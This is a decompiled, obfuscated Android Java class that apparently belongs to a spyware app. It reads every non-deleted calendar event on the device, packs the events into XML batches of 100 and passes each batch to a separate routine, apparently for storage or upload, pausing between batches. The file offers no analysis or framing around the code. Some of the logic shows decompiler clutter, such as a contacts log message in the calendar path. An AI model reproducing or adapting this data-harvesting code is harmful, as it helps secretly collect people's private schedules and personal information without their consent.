package com.network.a;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.util.Xml;
import com.network.android.SmsReceiver;
import com.network.android.c.a.a;
import com.network.android.j;
import java.io.StringWriter;
import org.xmlpull.v1.XmlSerializer;

final class b implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ ContentResolver f37a;
    final /* synthetic */ Context b;

    b(ContentResolver contentResolver, Context context) {
        this.f37a = contentResolver;
        this.b = context;
    }

    public final void run() {
        XmlSerializer xmlSerializer;
        Throwable th;
        XmlSerializer xmlSerializer2;
        StringWriter stringWriter;
        try {
            Cursor a2 = a.a(this.f37a);
            if (a2 == null) {
                com.network.android.c.a.b.a(1, 2002, "LOG_NO_CALENDAR");
                return;
            }
            a.a("readCalendar start: " + a2.getCount());
            if (a2.getCount() > 0) {
                XmlSerializer newSerializer = Xml.newSerializer();
                StringWriter stringWriter2 = new StringWriter();
                Context context = this.b;
                SmsReceiver.a(newSerializer, stringWriter2);
                newSerializer.startTag("", "calendar");
                XmlSerializer xmlSerializer3 = newSerializer;
                int i = 1;
                while (a2.moveToNext()) {
                    int i2 = i + 1;
                    try {
                        int i3 = a2.getInt(7);
                        a.a("AndroidCalendarWatcher Map Calendar position:" + a2.getPosition() + " isDeleted: " + i3);
                        if (i3 == 0) {
                            a.a(xmlSerializer3, a2, new StringBuffer(), "add");
                            if (i2 % 100 == 0) {
                                xmlSerializer3.endTag("", "calendar");
                                SmsReceiver.a(xmlSerializer3);
                                j.a(stringWriter2.toString(), this.b);
                                j.a(this.b);
                                a.a("readCalendar sleep chank: " + i2);
                                Thread.sleep(3000);
                                xmlSerializer = Xml.newSerializer();
                                try {
                                    stringWriter = new StringWriter();
                                } catch (Throwable th2) {
                                    th = th2;
                                    a.a("Event Exception- " + th.getMessage(), th);
                                    xmlSerializer3 = xmlSerializer;
                                    i = i2;
                                }
                                try {
                                    SmsReceiver.a(xmlSerializer, stringWriter);
                                    xmlSerializer.startTag("", "calendar");
                                    xmlSerializer2 = xmlSerializer;
                                    i = i2;
                                    xmlSerializer3 = xmlSerializer2;
                                    stringWriter2 = stringWriter;
                                } catch (Throwable th3) {
                                    stringWriter2 = stringWriter;
                                    th = th3;
                                    a.a("Event Exception- " + th.getMessage(), th);
                                    xmlSerializer3 = xmlSerializer;
                                    i = i2;
                                }
                            }
                        }
                        xmlSerializer2 = xmlSerializer3;
                        stringWriter = stringWriter2;
                        i = i2;
                        xmlSerializer3 = xmlSerializer2;
                        stringWriter2 = stringWriter;
                    } catch (Throwable th4) {
                        xmlSerializer = xmlSerializer3;
                        th = th4;
                        a.a("Event Exception- " + th.getMessage(), th);
                        xmlSerializer3 = xmlSerializer;
                        i = i2;
                    }
                }
                xmlSerializer3.endTag("", "calendar");
                SmsReceiver.a(xmlSerializer3);
                j.a(stringWriter2.toString(), this.b);
                j.a(this.b);
            } else {
                com.network.android.c.a.b.a(1, 2002, "LOG_NO_CONTACTS");
            }
            a2.close();
            a.a("readCalendar end");
        } catch (Throwable th5) {
            a.a("get Contacts Exception- " + th5.getMessage(), th5);
        }
    }
}
